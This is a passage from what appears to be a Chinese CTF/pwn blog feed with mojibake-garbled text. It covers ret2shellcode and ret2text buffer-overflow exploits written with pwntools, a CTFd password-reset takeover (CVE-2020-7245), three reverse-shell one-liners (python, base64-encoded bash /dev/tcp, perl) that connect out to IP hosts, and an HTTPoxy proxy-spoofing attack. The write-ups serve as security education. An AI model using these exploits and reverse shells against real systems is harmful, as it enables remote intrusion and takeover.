&lt;+153&gt;:ret</span><br></pre></td></tr></table></figure><p>åˆ†æstrncpyå‡½æ•°çš„ç›®å½•å­—ç¬¦ä¸²åœ°å€æ˜¯0x804a080ï¼Œè¿è¡Œreadelf -S xxxæŸ¥çœ‹bssæ®µä½ç½®</p><img src="/2020/03/20/Ret2Shellcode%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200120180354508.png" style="zoom:67%;"><p>æ˜¯ä¸€ä¸ªBSSæ®µï¼Œå¦‚æœå¯ä»¥æˆ‘ä»¬è®²shellcodeæ”¾åˆ°bssæ®µä¸­ï¼Œç„¶åå°†å‡½æ•°çš„è¿”å›å€¼æ”¹ä¸º0x804a080ï¼Œç°åœ¨è¿˜ç¼ºå°‘ä¸€ä¸ªæ¡ä»¶ï¼Œå°±æ˜¯bssæ®µ0x804a080æ˜¯å¦æœ‰æ‰§è¡Œæƒé™ï¼Œæˆ‘ä»¬æ–­ç‚¹è°ƒè¯•ä¸‹ï¼š</p><p>æ‰§è¡Œb main è¿›è¡Œæ–­ç‚¹</p><p>æ‰§è¡Œr è¿è¡Œç¨‹åº</p><p>æ‰§è¡ŒvmmapæŸ¥çœ‹æ˜¯å¦æœ‰æ‰§è¡Œæƒé™</p><p><img src="/2020/03/20/Ret2Shellcode%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200120180629000.png" alt="image-20200120180629000"></p><p>0x804a080çš„åŒºé—´æ˜¯åœ¨æ ‡çº¢çš„0x0804a000åˆ°0x0804b000ï¼Œæœ‰xæ‰§è¡Œæƒé™</p><p>ç¬¬äºŒæ­¥ï¼šæŸ¥æ‰¾ç¨‹åºæº¢å‡ºçš„åç§»é‡</p><p>é‡æ–°æ‰§è¡Œgdb ./ret2shellcodeå‘½ä»¤åŠ è½½ç¨‹åº</p><p>æ‰§è¡Œpattern create 200åˆ›å»ºå­—ç¬¦ä¸²</p><p>æ‰§è¡Œ rè¿è¡Œ</p><p>è¾“å…¥åˆšæ‰åˆ›å»ºçš„å­—ç¬¦ä¸²</p><p><img src="https://s1.51cto.com/images/20190416/1555417473535589.png?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt="https://s1.51cto.com/images/20190416/1555417473535589.png?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk="></p><p>å¾—åˆ°0x41384141åœ°å€ï¼Œæˆ‘ä»¬ä½¿ç”¨pattern offset 0x41384141æ¥æŸ¥çœ‹åç§»ï¼Œå¾—åˆ°112åç§»é‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">æ ‡å‡†åº“å‡½æ•°strncpy()ï¼Œå¯ä»¥å°†ä¸€å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†æ‹·è´åˆ°å¦ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ã€‚</span><br><span class="line"></span><br><span class="line">strncpy()å‡½æ•°æœ‰3ä¸ªå‚æ•°ï¼š</span><br><span class="line"></span><br><span class="line">1.å‚æ•°æ˜¯ç›®å½•å­—ç¬¦ä¸²ã€‚</span><br><span class="line"></span><br><span class="line">2.å‚æ•°æ˜¯æºå­—ç¬¦ä¸²;</span><br><span class="line"></span><br><span class="line">3.å‚æ•°æ˜¯ä¸€ä¸ªæ•´æ•°ã€‚ä»£è¡¨è¦ä»æºå­—ç¬¦ä¸²æ‹·è´åˆ°ç›®æ ‡å­—ç¬¦ä¸²ä¸­çš„å­—ç¬¦æ•°ã€‚</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch &#x3D; &#39;i386&#39;, os &#x3D; &#39;linux&#39;)</span><br><span class="line">p &#x3D; process(&quot;.&#x2F;ret2shellcode&quot;)</span><br><span class="line">shellcode &#x3D; asm(shellcraft.sh())</span><br><span class="line">payload &#x3D; shellcode.ljust(112,&#39;a&#39;)+p32(0x804a080)   &#x2F;&#x2F;å¡«å……åç§»é‡</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">ç›´æ¥è¦†ç›–äº†mainå‡½æ•°çš„è¿”å›åœ°å€åˆ°0x804a080æ‰§è¡Œshellcode</span><br></pre></td></tr></table></figure><p>å‚è€ƒé“¾æ¥ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ç¼“å†²åŒºæº¢å‡º-åŸºæœ¬ROP-ret2shellcode:</span><br><span class="line">https:&#x2F;&#x2F;blog.51cto.com&#x2F;11797152&#x2F;2379738?source&#x3D;dra</span><br><span class="line">pwntoolsä½¿ç”¨ç®€ä»‹2:</span><br><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;liuyimin&#x2F;p&#x2F;7379985.html</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwnåŸºç¡€çŸ¥è¯† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> Ret2ShellcodeåŸç† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ret2TextåŸç†åŠåº”ç”¨</title>
      <link href="/2020/03/20/Ret2Text%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/"/>
      <url>/2020/03/20/Ret2Text%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="0x-01-Ret2TextåŸç†"><a href="#0x-01-Ret2TextåŸç†" class="headerlink" title="0x 01 Ret2TextåŸç†"></a>0x 01 Ret2TextåŸç†</h3><ul><li>BSSæ®µé€šå¸¸æ˜¯æŒ‡ç”¨æ¥å­˜æ”¾ç¨‹åºä¸­æœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡çš„ä¸€å—å†…å­˜åŒºåŸŸã€‚BSSæ®µå±äºé™æ€å†…å­˜åˆ†é…ã€‚</li><li>Dataé€šå¸¸æ˜¯æŒ‡ç”¨æ¥å­˜æ”¾ç¨‹åºä¸­å·²åˆå§‹åŒ–çš„å…¨å±€å˜é‡çš„ä¸€å—å†…å­˜åŒºåŸŸã€‚æ•°æ®æ®µå±äºé™æ€å†…å­˜åˆ†é…ã€‚</li><li>Texté€šå¸¸æ˜¯æŒ‡ç”¨æ¥å­˜æ”¾ç¨‹åºæ‰§è¡Œä»£ç çš„ä¸€å—å†…å­˜åŒºåŸŸã€‚ç§°ä¸ºä»£ç æ®µã€‚</li><li>rodataæ®µå­˜æ”¾Cä¸­çš„å­—ç¬¦ä¸²å’Œ#defineå®šä¹‰çš„å¸¸é‡</li></ul><p>ret2text å³æ§åˆ¶ç¨‹åºæ‰§è¡Œç¨‹åºæœ¬èº«å·²æœ‰çš„çš„ä»£ç  (.text)ï¼Œä½¿EIPæŒ‡å‘å…·æœ‰system(â€œ/bin/shâ€)çš„ä»£ç æ®µ</p><p><img src="/2020/03/20/Ret2Text%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200120145330415.png" alt></p><h3 id="0x-02-å®ä¾‹åˆ†æ"><a href="#0x-02-å®ä¾‹åˆ†æ" class="headerlink" title="0x 02 å®ä¾‹åˆ†æ"></a>0x 02 å®ä¾‹åˆ†æ</h3><p>idaæŸ¥çœ‹ç¨‹åºä¸­,å­˜åœ¨systemå‡½æ•°</p><img src="/2020/03/20/Ret2Text%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200120145534968.png" style="zoom:50%;"><p>mainå‡½æ•°ä¼ªä»£ç å¦‚ä¸‹ï¼š</p><img src="/2020/03/20/Ret2Text%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200120145703503.png" style="zoom: 67%;"><p>é¦–å…ˆå¯»æ‰¾å¤šå°‘å­—èŠ‚èƒ½æº¢å‡ºåˆ‡åˆšå¥½èƒ½å¤Ÿè¦†ç›–return addrã€‚æˆ‘ä»¬ä½¿ç”¨gdb-pedaæä¾›çš„pattern_createå’Œpattern_offsetã€‚pattern_createæ˜¯ç”Ÿæˆä¸€ä¸ªå­—ç¬¦ä¸²æ¨¡æ¿è¾“å…¥åæ ¹æ®EIPæ¥ç¡®å®šè¦†ç›–return addrçš„é•¿åº¦ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ pattern_create 200</span><br><span class="line">&#39;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&#39;</span><br></pre></td></tr></table></figure><p>ç„¶åè®©ç¨‹åºè·‘èµ·æ¥è¾“å…¥è¿™ä¸²å­—ç¬¦ä¸²åç¨‹åºå´©æºƒã€‚æ ¹æ®é”™è¯¯åœ°å€è®¡ç®—åç§»é‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x41384141 in ?? ()</span><br><span class="line">gdb-peda$ pattern offset 0x41384141</span><br><span class="line">1094205761 found at offset: 112</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆexpå¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; process(&quot;.&#x2F;ret2text&quot;)</span><br><span class="line">payload &#x3D; 112 * &#39;a&#39; + p32(0x0804863a)   &#x2F;&#x2F;systemå‡½æ•°çš„å…¥å£åœ°å€</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwnåŸºç¡€çŸ¥è¯† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> Ret2TextåŸç† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>V&amp;Næ‹›æ–°å…¬å¼€èµ›é¢˜è§£</title>
      <link href="/2020/03/20/V-N%E6%8B%9B%E6%96%B0%E5%85%AC%E5%BC%80%E8%B5%9B%E9%A2%98%E8%A7%A3/"/>
      <url>/2020/03/20/V-N%E6%8B%9B%E6%96%B0%E5%85%AC%E5%BC%80%E8%B5%9B%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h3 id="0x-01-HappyCTFd"><a href="#0x-01-HappyCTFd" class="headerlink" title="0x 01 HappyCTFd"></a>0x 01 HappyCTFd</h3><ul><li><p>è€ƒç‚¹</p><p>CVE-2020-7245</p></li><li><p>è§£é¢˜è¿‡ç¨‹</p></li></ul><ol><li>åŸç†åˆ†æï¼š</li></ol><p>æ³¨å†Œç”¨æˆ·æ—¶åˆ¤æ–­ç”¨æˆ·æ˜¯å¦å­˜åœ¨çš„æ—¶å€™æ²¡æœ‰å¯¹ä¸¤ç«¯ç©ºæ ¼è¿›è¡Œå¤„ç†ï¼Œè€Œæ’å…¥æ•°æ®åº“çš„æ—¶å€™å»é™¤äº†ä¸¤ç«¯çš„ç©ºæ ¼ã€‚è€Œååœ¨é‡ç½®å¯†ç æ—¶ï¼Œç”¨çš„åˆæ˜¯è¿™ä¸ªè¢«å¤„ç†ä¹‹åçš„ç”¨æˆ·åã€‚</p><ol start="2"><li>æ”»å‡»æµç¨‹ï¼š</li></ol><blockquote><ol><li>åˆ©ç”¨æ·»åŠ ç©ºæ ¼ç»•è¿‡é™åˆ¶æ¥æ³¨å†Œä¸€ä¸ªä¸å—å®³è€…ç”¨æˆ·åç›¸åŒçš„è´¦å·</li><li>ç”Ÿæˆå¿˜è®°å¯†ç é“¾æ¥å‘é€åˆ°è‡ªå·±çš„é‚®ç®±</li><li>å°†è‡ªå·±çš„è´¦å·çš„ç”¨æˆ·åæ”¹æˆä¸è¢«æ”»å‡»è€…ä¸ç›¸åŒçš„ç”¨æˆ·å</li><li>ç”¨é‚®ç®±ä¸­æ”¶åˆ°çš„é“¾æ¥æ›´æ”¹å¯†ç å³å¯ã€‚</li></ol></blockquote><ol start="3"><li>é¦–å…ˆæ³¨å†Œä¸€ä¸ªç”¨æˆ·åä¸º â€œç©ºæ ¼+adminâ€ çš„è´¦æˆ·ã€‚</li></ol><p><img src="/2020/03/20/V-N%E6%8B%9B%E6%96%B0%E5%85%AC%E5%BC%80%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200320174410739.png" alt></p><p>ç„¶åç”¨éšç§çª—å£æ‰“å¼€ï¼Œå‘é€å¯†ç é‡ç½®é‚®ä»¶</p><p><img src="/2020/03/20/V-N%E6%8B%9B%E6%96%B0%E5%85%AC%E5%BC%80%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200320174705064.png" alt></p><p>ä¹‹åä¿®æ”¹è‡ªå·±çš„ç”¨æˆ·å</p><p><img src="/2020/03/20/V-N%E6%8B%9B%E6%96%B0%E5%85%AC%E5%BC%80%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200320174817943.png" alt></p><p>ç”¨é‚®ç®±ä¸­çš„é“¾æ¥æ¥é‡ç½®å¯†ç </p><p><img src="/2020/03/20/V-N%E6%8B%9B%E6%96%B0%E5%85%AC%E5%BC%80%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200320174915348.png" alt></p><p>åœ¨åå°éšè—çš„é¢˜ç›®ä¸­æ‰¾åˆ°äº†flag</p><p><img src="/2020/03/20/V-N%E6%8B%9B%E6%96%B0%E5%85%AC%E5%BC%80%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200320175042556.png" alt></p><p>å‚è€ƒèµ„æ–™ï¼š</p><blockquote><p><a href="https://www.colabug.com/2020/0204/6940556/" target="_blank" rel="noopener">https://www.colabug.com/2020/0204/6940556/</a></p></blockquote><h3 id="0x-02-CHECKIN"><a href="#0x-02-CHECKIN" class="headerlink" title="0x 02 CHECKIN"></a>0x 02 CHECKIN</h3><ul><li><p>è€ƒç‚¹</p><p>Linux åŸºæœ¬çŸ¥è¯†</p></li><li><p>è§£é¢˜è¿‡ç¨‹</p></li></ul><ol><li>é¡µé¢å³é”®æ‰“å¼€æŸ¥çœ‹æºä»£ç è¿›è¡Œå®¡è®¡</li></ol><p><img src="/2020/03/20/V-N%E6%8B%9B%E6%96%B0%E5%85%AC%E5%BC%80%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200320180352562.png" alt></p><p>shellè·¯ç”±é€šè¿‡ä¼ å…¥å‚æ•°å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œåœ¨æ¯æ¬¡æ‰§è¡Œå‘½ä»¤å‰éƒ½ä¼šæŠŠ flag æ–‡ä»¶åˆ é™¤ä¸”ä¸å¸¦å›æ˜¾ç»“æœ</p><ol start="2"><li>å› ä¸ºæ˜¯pythonåº”ç”¨ï¼Œå…ˆåå¼¹ä¸€ä¸ªshellåˆ°å†…ç½‘çš„ä¸€ä¸ªé¶æœºä¸­</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ç¬¬ä¸€ç§</span><br><span class="line">python3 -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;174.1.34.205&quot;,9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br><span class="line"></span><br><span class="line">ç¬¬äºŒç§</span><br><span class="line">echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE3NC4wLjIyMi4yMDMvMTIzNCAwPiYxCg&#x3D;&#x3D;|base64 -d|bash</span><br><span class="line"></span><br><span class="line">ç¬¬ä¸‰ç§</span><br><span class="line">perl -MIO -e &#39;$p&#x3D;fork;exit,if($p);$c&#x3D;new IO::Socket::INET(PeerAddr,&quot;174.0.222.203:1234&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;</span><br></pre></td></tr></table></figure><p><img src="/2020/03/20/V-N%E6%8B%9B%E6%96%B0%E5%85%AC%E5%BC%80%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200320182713990.png" alt></p><p>è¿™é‡Œå¼•å…¥æ–‡ä»¶æè¿°ç¬¦ï¼š</p><p><strong>ä»€ä¹ˆæ˜¯æ–‡ä»¶æè¿°ç¬¦ï¼š</strong>å†…æ ¸åˆ©ç”¨æ–‡ä»¶æè¿°ç¬¦æ¥è®¿é—®æ–‡ä»¶ã€‚æ–‡ä»¶æè¿°ç¬¦æ˜¯éè´Ÿæ•´æ•°ã€‚æ‰“å¼€ç°å­˜æ–‡ä»¶æˆ–æ–°å»ºæ–‡ä»¶æ—¶ï¼Œå†…æ ¸ä¼šè¿”å›ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ã€‚è¯»å†™æ–‡ä»¶ä¹Ÿéœ€è¦ä½¿ç”¨æ–‡ä»¶æè¿°ç¬¦æ¥æŒ‡å®šå¾…è¯»å†™çš„æ–‡ä»¶ã€‚</p><p>ä¾‹å¦‚Pythonä¸­ï¼Œå½“æˆ‘ä»¬open()å‡½æ•°æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶æ—¶ä¾¿åˆ›å»ºäº†ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œè€Œåå¯¹è¿™ä¸ªæ–‡ä»¶æè¿°ç¬¦ä½¿ç”¨read()å‡½æ•°ä¾¿æ˜¯è¯»å–æ–‡ä»¶æè¿°ç¬¦ä¸­çš„å†…å®¹ï¼Œclose()å‡½æ•°ç”¨äºå…³é—­/é”€æ¯è¿™ä¸ªæ–‡ä»¶æè¿°ç¬¦ã€‚</p><p><strong>æ–‡ä»¶æè¿°ç¬¦å‚¨å­˜åœ¨ä»€ä¹ˆåœ°æ–¹ï¼š</strong><code>/proc/&lt;pid&gt;/fd&lt;id&gt;</code></p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡catè¿›ç¨‹ä¸­çš„fdæ¥è·å–åˆ°æ–‡ä»¶æè¿°ç¬¦ã€‚ç›¸å…³çŸ¥è¯†ç‚¹åœ¨é«˜æ ¡è¿ç»´æŒ‘æˆ˜èµ›ä¸­ä¹Ÿè€ƒåˆ°äº†ã€‚</p><p>åˆ©ç”¨<code>cat /proc/*/fd/*</code>è¯»å–æ–‡ä»¶ç¼“å­˜æ‰¾åˆ°è¢«ç§»é™¤çš„flag.txtï¼Œå¾—åˆ°flag</p><p><img src="/2020/03/20/V-N%E6%8B%9B%E6%96%B0%E5%85%AC%E5%BC%80%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200320183213503.png" alt></p><h3 id="0x-03-TimeTravle"><a href="#0x-03-TimeTravle" class="headerlink" title="0x 03 TimeTravle"></a>0x 03 TimeTravle</h3><ul><li><p>è€ƒç‚¹</p><p>HTTPoxyæ¼æ´ï¼ˆCVE-2016-5385ï¼‰</p></li><li><p>è§£é¢˜è¿‡ç¨‹</p></li></ul><ol><li>é¡µé¢æ‰“å¼€æ˜¾ç¤ºäº†æºä»£ç ï¼Œè¿›è¡Œå®¡è®¡</li></ol><p><img src="/2020/03/20/V-N%E6%8B%9B%E6%96%B0%E5%85%AC%E5%BC%80%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200320195204663.png" alt></p><p>ä¼ å…¥å‚æ•°flagï¼Œä¼šè¯·æ±‚ä¸€ä¸ª HTTPAPI æœåŠ¡ï¼Œé‚£ä¸ªæœåŠ¡è¿”å› success çš„è¯å°±æ‰§è¡Œç¨‹åºè¯» flagã€‚</p><p>ä¼ å…¥å‚æ•°fileï¼Œå°±å›å»è¯»è¿™ä¸ªæ–‡ä»¶ã€‚</p><p>ä¼ å…¥å‚æ•°phpinfoï¼Œå°±ä¼šæ‰§è¡Œ phpinfoã€‚</p><ol start="2"><li>ç”¨è¿”å›åŒ…ä¸­å¯ä»¥çŸ¥é“æœåŠ¡å™¨ä½¿ç”¨çš„æ˜¯Nginx + PHPï¼ŒæŸ¥çœ‹phpinfoæœåŠ¡å™¨æ˜¯cgiæ¨¡å¼ï¼Œç¬¦åˆ<a href="https://github.com/vulhub/vulhub/tree/master/cgi/httpoxy" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/cgi/httpoxy</a> æ‰€è¿°ï¼Œæˆ‘ä»¬éœ€è¦ä¼ å…¥ä¸€ä¸ª Proxyå¤´ï¼Œä½¿å…¶äº§ç”Ÿä¸€ä¸ª HTTP_PROXY ç¯å¢ƒå˜é‡ï¼Œè¿™ä¸ªç¯å¢ƒå˜é‡å†è¢«ç¨‹åºé‡Œçš„ GuzzleHttp ä½¿ç”¨ï¼Œå³å¯ä½¿æµé‡èµ°ä»£ç†ï¼Œæ§åˆ¶è¿”å›çš„è¯·æ±‚ã€‚</li><li>å°è¯•è¿›è¡Œæ–‡ä»¶è¯»å–<code>/start.sh</code></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env bash</span><br><span class="line"></span><br><span class="line">chmod +x &#x2F;readflag</span><br><span class="line">chmod +s &#x2F;readflag</span><br><span class="line">echo $FLAG &gt; &#x2F;flag &amp;&amp; export FLAG&#x3D;not_flag &amp;&amp; FLAG&#x3D;not_flag &amp;&amp; cd &#x2F;srv&#x2F;</span><br><span class="line"></span><br><span class="line">chmod 700 &#x2F;flag</span><br><span class="line"></span><br><span class="line">python3 &#x2F;srv&#x2F;app.py &amp;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">php-fpm &amp;</span><br><span class="line"></span><br><span class="line">service nginx start</span><br><span class="line"></span><br><span class="line">tail -F &#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure><p>å¼€å¯äº†<code>php-fpm</code>ï¼Œ<code>http://127.0.0.1:5000/api/eligible</code>æœåŠ¡å°±æ˜¯è¿™ä¸ª<code>/srv/app.py</code>æä¾›çš„,è¯»å–<code>/srv/app.py</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">import datetime</span><br><span class="line">import json</span><br><span class="line">app &#x3D; Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;api&#x2F;eligible&#39;)</span><br><span class="line">def source():</span><br><span class="line">    current_year &#x3D; int(datetime.datetime.now().strftime(&quot;%Y&quot;))</span><br><span class="line">    if current_year &lt; 2050:</span><br><span class="line">        return json.dumps(&#123;&quot;success&quot;: False&#125;)</span><br><span class="line">    else:</span><br><span class="line">        return json.dumps(&#123;&quot;success&quot;: True&#125;)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    app.run(host&#x3D;&#39;127.0.0.1&#39;)</span><br></pre></td></tr></table></figure><ol start="4"><li>æ–¹æ³•ä¸€ï¼šæ„é€ ä¸€ä¸ªresponseè¿”å›å°±å¯ä»¥äº†ï¼Œå‚è€ƒä¸€ä½å¸ˆå‚…çš„payloadï¼š</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Server: nginx&#x2F;1.14.2</span><br><span class="line">Date: Sat, 29 Feb 2020 05:27:31 GMT</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;UTF-8</span><br><span class="line">Connection: Keep-alive</span><br><span class="line">Content-Length: 16</span><br><span class="line"></span><br><span class="line">&#123;&quot;success&quot;:true&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/03/20/V-N%E6%8B%9B%E6%96%B0%E5%85%AC%E5%BC%80%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200320194617008.png" alt></p><p><img src="/2020/03/20/V-N%E6%8B%9B%E6%96%B0%E5%85%AC%E5%BC%80%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200320194548045.png" alt></p><p>æ–¹æ³•äºŒï¼šç”¨SimpleHTTPServeræ¨¡å—</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> BaseHTTPRequestHandler, HTTPServer</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DemoHttpServer</span><span class="params">(BaseHTTPRequestHandler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">do_GET</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.send_response(<span class="number">200</span>, message=<span class="string">'OK'</span>)</span><br><span class="line">        self.send_header(<span class="string">'Content-Type'</span>, <span class="string">'application/json'</span>)</span><br><span class="line">        self.end_headers()</span><br><span class="line">        self.wfile.write(json.dumps(&#123;<span class="string">"success"</span>: <span class="literal">True</span>&#125;).encode())</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    server = HTTPServer((<span class="string">'0.0.0.0'</span>, <span class="number">1234</span>), DemoHttpServer)</span><br><span class="line">    print(<span class="string">'Server is running, user &lt;Ctrl+C&gt; to srop.'</span>)</span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure><p>æ–¹æ³•ä¸‰ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$arr = <span class="keyword">array</span>(<span class="string">"success"</span>=&gt;<span class="keyword">true</span>);</span><br><span class="line">header(<span class="string">"Content-Type:application/json"</span>);</span><br><span class="line"><span class="keyword">echo</span> json_encode($arr);</span><br></pre></td></tr></table></figure><p>å½“å‰ç›®å½•å¯åŠ¨<code>php -S 0:2333</code></p><p>å‚è€ƒèµ„æ–™ï¼š</p><blockquote><p><a href="https://github.com/vulhub/vulhub/tree/master/cgi/httpoxy" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/cgi/httpoxy</a></p></blockquote><h3 id="0x-04-EasySpringMVC"><a href="#0x-04-EasySpringMVC" class="headerlink" title="0x 04 EasySpringMVC"></a>0x 04 EasySpringMVC</h3><p>å¾…è¡¥ä¸Š</p><p>å‚è€ƒèµ„æ–™ï¼š</p><blockquote><p><a href="https://blog.csdn.net/Leon_cx/article/details/81517603" target="_blank" rel="noopener">https://blog.csdn.net/Leon_cx/article/details/81517603</a></p><p><a href="https://blog.csdn.net/chasingin/article/details/104593868" target="_blank" rel="noopener">https://blog.csdn.net/chasingin/article/details/104593868</a></p><p><a href="https://www.zhaoj.in/read-6407.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-6407.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctfwp </category>
          
      </categories>
      
      
        <tags>
            
